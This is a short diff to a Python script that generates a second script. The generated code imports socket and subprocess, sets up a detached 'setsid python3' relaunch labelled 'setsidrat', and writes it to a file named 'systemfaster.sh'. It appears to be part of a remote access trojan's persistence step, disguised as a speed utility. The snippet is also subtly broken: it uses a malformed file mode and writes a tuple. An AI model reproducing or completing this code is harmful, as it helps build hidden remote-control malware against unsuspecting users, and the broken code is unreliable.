@@ -7,7 +7,7 @@ other_python_script = f"""
 import socket
 import subprocess
 import os
-p = os.path.realpath(__file__)
+p = os.path.dirname(os.path.abspath(__file__))
 setsidrat = ("setsid python3", p)
 with open("systemfaster.sh", " w") as python_script_file:
     python_script_file.write(setsidrat)
